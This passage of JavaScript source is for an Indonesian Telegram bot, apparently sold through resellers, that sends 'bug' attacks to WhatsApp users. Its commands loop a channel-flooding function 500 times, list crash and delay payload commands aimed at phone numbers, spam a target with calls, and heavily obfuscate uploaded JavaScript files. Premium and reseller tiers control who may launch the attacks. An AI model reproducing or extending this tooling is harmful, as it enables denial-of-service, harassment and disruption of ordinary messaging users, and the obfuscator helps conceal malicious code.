┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venomui
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venomch(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!!\nLu Gak ada Hak Gunain Venom Private");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan ID saluran!\nContoh: /venomch id@newsletter");
  }

  let targetChannel = match[1].trim();

  try {
    for (let r = 0; r < 500; r++) {
      await VenomChannel(targetChannel);
    }
    bot.sendMessage(chatId, `✅ Pesan dikirim ke saluran *${targetChannel}* sebanyak 500 kali.`);
  } catch (err) {
    console.error("Error saat mengirim ke channel:", err);
    bot.sendMessage(chatId, "❌ Gagal mengirim ke saluran, coba lagi nanti.");
  }
});

bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Venom Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀VenomIsBack舀" + "肀VenomIsBack舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VenomIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
┃             -- 𝗩𝗘𝗡𝗢𝗠 𝗕𝗢𝗧 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});

// ============ PREMIUM MANAGEMENT (KHUSUS RESELLER) ============
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  // Hanya reseller yang bisa add premium
  if (!isReseller(senderId) && !isOwner(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Reseller Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Format Salah!\nContoh: /addprem 628123456789");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (isNaN(userId)) {
      return bot.sendMessage(chatId, "❌ ID harus angka!\nContoh: /addprem 628123456789");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`);
      bot.sendMessage(chatId, `✅ User ${userId} Berhasil Mendapatkan Akses Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ User ${userId} Sudah Menjadi Premium.`);
  }
});

bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  // Hanya reseller yang bisa hapus premium
  if (!isReseller(senderId) && !isOwner(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Reseller Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Format Salah!\nContoh: /delprem 628123456789");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (isNaN(userId)) {
      return bot.sendMessage(chatId, "❌ ID harus angka!\nContoh: /delprem 628123456789");
  }

  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Removed ${userId} From Premium`);
      bot.sendMessage(chatId, `✅ User ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ User ${userId} Bukan Premium.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  // Bisa dilihat semua user
  if (premiumUsers.length === 0) return bot.sendMessage(chatId, "📋 Belum ada user premium!");
  
  let message = "📋 *DAFTAR PREMIUM USER:*\n\n";
  premiumUsers.forEach((id, i) => {
      message += `${i+1}. \`${id}\`\n`;
  });
  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/info/, (msg) => {
  const chatId = msg.chat.id;
  
  const info = `
╔══════════════════════════════════════╗
║   📊 VENOM RESELLER INFO             ║
╠══════════════════════════════════════╣
║ 👑 Owner: ${owner.length + OwnerUsers.length}
║ 👔 Admin: ${adminUsers.length}
║ 📦 Reseller: ${resellerUsers.length}
║ 💎 Premium: ${premiumUsers.length}
║ 🚫 Banned: ${bannedUser.length}
╚══════════════════════════════════════╝
📍 Token DB: ✅ ACTIVE
👑 HeriKeyzenlocker - Banjaran Sudom
  `;
  bot.sendMessage(chatId, info);
});

// Callback Query
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    let whatsappStatus = true;
    let getOnlineDuration = () => "1h 23m";

    try {
        if (action === "bugmenu") {
            let ligma = `𖤊───⪩  𝐕𝐄𝐍𝐎𝐌 𝟖.𝟎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Role : ${isReseller(senderId) ? "✅ RESELLER" : "❌ USER BIASA"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭────── 「 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮 」 ──────╮
│➥ /venomori 62×××
│➥ /venombeta 62×××
│➥ /venombussines 62×××
│➥ /venomios 62×××
│➥ /venomdelay 62×××
│➥ /venomui 62×××
╰──────────────────────╯`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [[{ text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭", url: "https://t.me/HeriKeyzenlocker" }]]
                }
            });
        } else if (action === "toolsmenu") {
            let ligma = `𖤊───⪩  𝐕𝐄𝐍𝐎𝐌 𝟖.𝟎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Role : ${isReseller(senderId) ? "✅ RESELLER" : "❌ USER BIASA"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」──────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
╰──────────────────────╯`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [[{ text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭", url: "https://t.me/HeriKeyzenlocker" }]]
                }
            });
        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);
        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp();
